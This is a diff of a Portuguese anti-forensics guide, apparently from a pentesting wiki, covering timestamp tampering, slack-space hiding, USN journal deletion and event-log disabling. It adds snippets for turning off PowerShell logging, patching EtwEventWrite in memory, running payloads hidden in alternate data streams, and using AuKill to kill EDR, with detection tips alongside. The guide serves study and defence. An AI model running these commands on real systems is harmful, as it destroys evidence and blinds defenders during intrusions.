@@ -17,19 +17,19 @@ Esta ferramenta **modifica** as informações de carimbo de data/hora dentro de 
 
 ### Usnjrnl
 
-O **USN Journal** (Update Sequence Number Journal) é um recurso do NTFS (sistema de arquivos Windows NT) que rastreia alterações no volume. A ferramenta [**UsnJrnl2Csv**](https://github.com/jschicht/UsnJrnl2Csv) permite a análise dessas alterações.
+O **USN Journal** (Journal de Número de Sequência de Atualização) é um recurso do NTFS (sistema de arquivos Windows NT) que rastreia mudanças no volume. A ferramenta [**UsnJrnl2Csv**](https://github.com/jschicht/UsnJrnl2Csv) permite a análise dessas mudanças.
 
 ![](<../../images/image (801).png>)
 
-A imagem anterior é a **saída** mostrada pela **ferramenta**, onde pode-se observar que algumas **alterações foram realizadas** no arquivo.
+A imagem anterior é a **saída** mostrada pela **ferramenta**, onde pode-se observar que algumas **mudanças foram realizadas** no arquivo.
 
 ### $LogFile
 
-**Todas as alterações de metadados em um sistema de arquivos são registradas** em um processo conhecido como [write-ahead logging](https://en.wikipedia.org/wiki/Write-ahead_logging). Os metadados registrados são mantidos em um arquivo chamado `**$LogFile**`, localizado no diretório raiz de um sistema de arquivos NTFS. Ferramentas como [LogFileParser](https://github.com/jschicht/LogFileParser) podem ser usadas para analisar este arquivo e identificar alterações.
+**Todas as mudanças de metadados em um sistema de arquivos são registradas** em um processo conhecido como [write-ahead logging](https://en.wikipedia.org/wiki/Write-ahead_logging). Os metadados registrados são mantidos em um arquivo chamado `**$LogFile**`, localizado no diretório raiz de um sistema de arquivos NTFS. Ferramentas como [LogFileParser](https://github.com/jschicht/LogFileParser) podem ser usadas para analisar este arquivo e identificar mudanças.
 
 ![](<../../images/image (137).png>)
 
-Novamente, na saída da ferramenta é possível ver que **algumas alterações foram realizadas**.
+Novamente, na saída da ferramenta é possível ver que **algumas mudanças foram realizadas**.
 
 Usando a mesma ferramenta, é possível identificar **a que hora os carimbos de data/hora foram modificados**:
 
@@ -50,24 +50,24 @@ Os carimbos de data/hora do **NTFS** têm uma **precisão** de **100 nanosegundo
 
 ### SetMace - Ferramenta Anti-forense
 
-Esta ferramenta pode modificar ambos os atributos `$STARNDAR_INFORMATION` e `$FILE_NAME`. No entanto, a partir do Windows Vista, é necessário que um sistema operacional ao vivo modifique essas informações.
+Esta ferramenta pode modificar ambos os atributos `$STARNDAR_INFORMATION` e `$FILE_NAME`. No entanto, a partir do Windows Vista, é necessário que um sistema operacional ativo modifique essas informações.
 
 ## Ocultação de Dados
 
-O NFTS usa um cluster e o tamanho mínimo da informação. Isso significa que se um arquivo ocupa e usa um cluster e meio, a **metade restante nunca será utilizada** até que o arquivo seja excluído. Portanto, é possível **ocultar dados neste espaço de sobra**.
+O NFTS usa um cluster e o tamanho mínimo de informação. Isso significa que se um arquivo ocupa um e meio cluster, a **metade restante nunca será utilizada** até que o arquivo seja excluído. Portanto, é possível **ocultar dados neste espaço não utilizado**.
 
 Existem ferramentas como slacker que permitem ocultar dados neste espaço "oculto". No entanto, uma análise do `$logfile` e `$usnjrnl` pode mostrar que alguns dados foram adicionados:
 
 ![](<../../images/image (1060).png>)
 
-Então, é possível recuperar o espaço de sobra usando ferramentas como FTK Imager. Note que esse tipo de ferramenta pode salvar o conteúdo ofuscado ou até mesmo criptografado.
+Então, é possível recuperar o espaço não utilizado usando ferramentas como FTK Imager. Note que esse tipo de ferramenta pode salvar o conteúdo ofuscado ou até mesmo criptografado.
 
 ## UsbKill
 
-Esta é uma ferramenta que **desliga o computador se qualquer alteração nas portas USB** for detectada.\
+Esta é uma ferramenta que **desliga o computador se qualquer mudança nas portas USB** for detectada.\
 Uma maneira de descobrir isso seria inspecionar os processos em execução e **revisar cada script python em execução**.
 
-## Distribuições Linux ao Vivo
+## Distribuições Live Linux
 
 Essas distros são **executadas dentro da memória RAM**. A única maneira de detectá-las é **caso o sistema de arquivos NTFS esteja montado com permissões de gravação**. Se estiver montado apenas com permissões de leitura, não será possível detectar a intrusão.
 
@@ -85,7 +85,7 @@ Esta é uma chave de registro que mantém datas e horas quando cada executável 
 
 Desativar o UserAssist requer duas etapas:
 
-1. Defina duas chaves de registro, `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackProgs` e `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackEnabled`, ambas para zero a fim de sinalizar que queremos desativar o UserAssist.
+1. Defina duas chaves de registro, `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackProgs` e `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackEnabled`, ambas para zero, a fim de sinalizar que queremos desativar o UserAssist.
 2. Limpe suas subárvores de registro que se parecem com `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\<hash>`.
 
 ### Desativar Carimbos de Data/Hora - Prefetch
@@ -142,12 +142,81 @@ Também é possível modificar a configuração de quais arquivos serão copiado
 
 ### Desativar logs de eventos do Windows
 
-- `reg add 'HKLM\SYSTEM\CurrentControlSet\Services\eventlog' /v Start /t REG_DWORD /d 4 /f`
+- `reg add 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\eventlog' /v Start /t REG_DWORD /d 4 /f`
 - Dentro da seção de serviços, desative o serviço "Windows Event Log"
 - `WEvtUtil.exec clear-log` ou `WEvtUtil.exe cl`
 
 ### Desativar $UsnJrnl
 
 - `fsutil usn deletejournal /d c:`
+
+---
+
+## Registro Avançado & Manipulação de Rastreio (2023-2025)
+
+### Registro de ScriptBlock/Module do PowerShell
+
+Versões recentes do Windows 10/11 e Windows Server mantêm **artefatos forenses ricos do PowerShell** sob
+`Microsoft-Windows-PowerShell/Operational` (eventos 4104/4105/4106).
+Os atacantes podem desativá-los ou apagá-los em tempo real:
+```powershell
+# Turn OFF ScriptBlock & Module logging (registry persistence)
+New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\PowerShell\\3\\PowerShellEngine" \
+-Name EnableScriptBlockLogging -Value 0 -PropertyType DWord -Force
+New-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging" \
+-Name EnableModuleLogging -Value 0 -PropertyType DWord -Force
+
+# In-memory wipe of recent PowerShell logs
+Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' |
+Remove-WinEvent               # requires admin & Win11 23H2+
+```
+Os defensores devem monitorar alterações nessas chaves de registro e a remoção em grande volume de eventos do PowerShell.
+
+### Patch ETW (Event Tracing for Windows)
+
+Os produtos de segurança de endpoint dependem fortemente do ETW. Um método de evasão popular de 2024 é
+patchar `ntdll!EtwEventWrite`/`EtwEventWriteFull` na memória para que cada chamada ETW retorne `STATUS_SUCCESS`
+sem emitir o evento:
+```c
+// 0xC3 = RET on x64
+unsigned char patch[1] = { 0xC3 };
+WriteProcessMemory(GetCurrentProcess(),
+GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite"),
+patch, sizeof(patch), NULL);
+```
+Public PoCs (e.g. `EtwTiSwallow`) implement the same primitive in PowerShell ou C++.
+Como o patch é **local ao processo**, EDRs executando dentro de outros processos podem não detectá-lo.
+Detecção: compare `ntdll` na memória vs. no disco, ou faça hook antes do modo usuário.
+
+### Revitalização de Fluxos de Dados Alternativos (ADS)
+
+Campanhas de malware em 2023 (e.g. **FIN12** loaders) foram vistas preparando binários de segunda fase
+dentro de ADS para se manter fora da vista de scanners tradicionais:
+```cmd
+rem Hide cobalt.bin inside an ADS of a PDF
+type cobalt.bin > report.pdf:win32res.dll
+rem Execute directly
+wmic process call create "cmd /c report.pdf:win32res.dll"
+```
+Enumere fluxos com `dir /R`, `Get-Item -Stream *` ou Sysinternals `streams64.exe`. Copiar o arquivo host para FAT/exFAT ou via SMB removerá o fluxo oculto e pode ser usado por investigadores para recuperar a carga útil.
+
+### BYOVD & “AuKill” (2023)
+
+Bring-Your-Own-Vulnerable-Driver agora é rotineiramente usado para **anti-forensics** em intrusões de ransomware. A ferramenta de código aberto **AuKill** carrega um driver assinado, mas vulnerável (`procexp152.sys`), para suspender ou encerrar sensores EDR e forenses **antes da criptografia e destruição de logs**:
+```cmd
+AuKill.exe -e "C:\\Program Files\\Windows Defender\\MsMpEng.exe"
+AuKill.exe -k CrowdStrike
+```
+O driver é removido posteriormente, deixando artefatos mínimos.  
+Mitigações: habilitar a lista de bloqueio de drivers vulneráveis da Microsoft (HVCI/SAC) e alertar sobre a criação de serviços do kernel a partir de caminhos graváveis pelo usuário.
+
+---
+
+## Referências
+
+- Sophos X-Ops – “AuKill: A Weaponized Vulnerable Driver for Disabling EDR” (Março 2023)  
+https://news.sophos.com/en-us/2023/03/07/aukill-a-weaponized-vulnerable-driver-for-disabling-edr  
+- Red Canary – “Patching EtwEventWrite for Stealth: Detection & Hunting” (Junho 2024)  
+https://redcanary.com/blog/etw-patching-detection  
 
 {{#include ../../banners/hacktricks-training.md}}
